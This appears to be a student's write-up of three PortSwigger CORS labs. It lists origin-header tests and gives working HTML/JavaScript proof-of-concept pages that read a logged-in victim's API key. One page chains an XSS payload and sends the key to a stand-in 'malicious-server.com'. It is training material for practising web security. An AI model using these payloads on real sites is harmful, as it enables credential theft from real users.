### PortSwigger Labs

**Test Cases**
* If there's an error assume it doesn't work

  1. Try putting a random url into the `Origin:` header and repeating the request
    + If the _request still works_, then it's probably **taking in user input** for origin
    + If reponse **allows credentials** & takes user input for origin, sensitive info can be grabbed
    
  2. Change the origin header to the `null` value
    + If reponse **allows credentials** & takes user input for origin, api key can be grabbed
    
  3. Change the origin header to one that **begins** with the _origin of the site_,
     but has _malicious subdomain_
    - May need to put _scheme_ as well like `https://`
    - Example: `https://vulnerable-site.com.malicious.net`
     * `https://vulnerable-site.com` is the original site
     * `.malicious.net` is user controlled
 
  4. Change the origin header to one that **end** with th _origin of the site_,
     but has _malicious subdomain_ 
    - May need to put scheme as well like `https://`
    - Example: `https://randomurl.vulnerable-site.com`
     * `https://vulnerable-site.com` is the original site
     * `randomur.` is user controlled
    
   ==========================================================
   

**LAB 1 - CORS vulnerability with basic origin reflection**

+ `GET /accountDetails` - The target API that has useful info (api key)
 - Sent request to _Repeater in Burp_

+ `Access-Control-Allow-Credentials: true` so credentials is being used
 - Target Goal - exploit the CORS misconfiguration to retrieve the _administrator's API key_ or 
   your own creds as a proof of concept

Testing for CORS misconfigurations:
  1. Try putting a random url into the `Origin:` header and repeating the request
    + If the _request still works_, then it's probably **taking in user input** for origin
    + Since this allows credentials & takes user input for origin, api key can be grabbed

```PoC-Run_In_Local_Server_Like_Python_SimpleHTTPSever
<html>
    <body>
    <h1>Hello</h1>
    <script>
        var xhr = new XMLHttpRequest();
        var url = 'https://vulnerable-site.com'; // this URL should be from the `Host:` header in request
        
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                fetch('/log?key=' + xhr.responseText) // grabbing the api key (based on what's in response)
            }
        }
        
        xhr.open('GET', url + '/accountDetails', true);
        xhr.withCredentials = true;
        xhr.send(null)
    </script>
    </body>
</html>
```


   ==========================================================
   

**LAB 2 - CORS vulnerability with trusted null origin**

+ `GET /accountDetails` - The target API that has useful info (api key)
 - Sent request to _Repeater in Burp_

+ `Access-Control-Allow-Credentials: true` so credentials is being used
 - Target Goal - exploit the CORS misconfiguration to retrieve the _administrator's API key_


Testing for CORS misconfigurations:
  1. Try putting a random url into the `Origin:` header and repeating the request
    - _Didn't work for this lab_
    
  2. Change the origin header to the `null` value
    + If this works, we will have to use an `iframe`

```PoC-Run_In_Local_Server_Like_Python_SimpleHTTPSever
<html>
    <body>
    <h1>Hello</h1>
    
    //iframe added
    <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
    <script>
        var xhr = new XMLHttpRequest();
        var url = 'https://vulnerable-site.com'; // this URL should be from the `Host:` header in request
        
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
            
                fetch('https://vulnerable-site.com/log?key=' + xhr.responseText)
                     // ^Have to specify url (from `Host:` header in request)
                     // since in a sandbox when grabbing the api key (based on what's in response)
            }
        }
        
        xhr.open('GET', url + '/accountDetails', true);
        xhr.withCredentials = true;
        xhr.send(null)
        
    </script>"></iframe>
    //added iframe end
    
    </body>
</html>
```
+ Note that if using `python -m SimpleHTTPSever 5555`,
  the _URL_ in `fetch()` must have `:5555` after the _URL_

   ==========================================================
   
**LAB 3 - CORS vulnerability with trusted insecure protocols**
  **CORS & XSS**

+ `GET /accountDetails` - The target API that has useful info (api key)
 - Sent request to _Repeater in Burp_

+ `Access-Control-Allow-Credentials: true` so credentials is being used
 - Target Goal - exploit the CORS misconfiguration to retrieve the _administrator's API key_
 
+ You need to acutally find a subdomain in target app to test on
 - When click `Check stock` you find a _subdomain:_ `https://stock.vulnerable-site.com`
                                                             
+ There's an XSS vulnerability in the `GET request` to the above stock subdomain
 - `GET/?productId=<script>alert(document.domain)</script>&storeId=1`

+ We need to store our _JS_ into the _XSS vulnerable parameter_



Testing for CORS misconfigurations:
  1. Try putting a random url into the `Origin:` header and repeating the request
    - _Didn't work for this lab_
    
  2. Change the origin header to the `null` value
    - _Didn't work for this lab_
    
  3. Change the origin header to one that **begins** with th _origin of the site_,
     but has malicious subdomain
    - May need to put scheme as well like `https://`
    - Example: `https://vulnerable-site.com.malicious.net`
     * `https://vulnerable-site.com` is the original site
     * `.malicious.net` is user controlled

  4. Change the origin header to one that **end** with th _origin of the site_,
     but has malicious subdomain
    - May need to put scheme as well like `https://`
    - Example: `https://randomurl.vulnerable-site.com`
     * `https://vulnerable-site.com` is the original site
     * `randomur.` is user controlled

```PoC-Run_In_Local_Server_Like_Python_SimpleHTTPSever
<html>
    <body>
    <h1>Hello</h1>
    
    <script>
        // Had to make this JS Chunk one line to fit as XSS
                                                                   //v---new script tag opening (XSS) 
        document.location="https://vulnerable-site.com/?productId="<script>var xhr = new XMLHttpRequest();var url = 'https://vulnerable-site.com';xhr.onreadystatechange = function() {if (xhr.readyState == XMLHttpRequest.DONE) {fetch('https://malicious-server.com/log?key=' %2b xhr.responseText)}}xhr.open('GET', url %2b '/accountDetails', true);xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1"
      
       // the `/log?key=` is within the malicious-server.com cause that's the keword to grab api key?
       //  ^try testing this without it to see
       // %2b is the URL encoding of `+`
       // %3c is the URL encoding of `<`
       
    </script>
    
    </body>
</html>
```
+ May need to look at `Console` in _Developer Tools_ to debug this
+ Note that if using `python -m SimpleHTTPSever 5555`,
  the _URL_ in `fetch()` must have `:5555` after the _URL_

   ==========================================================
   
   
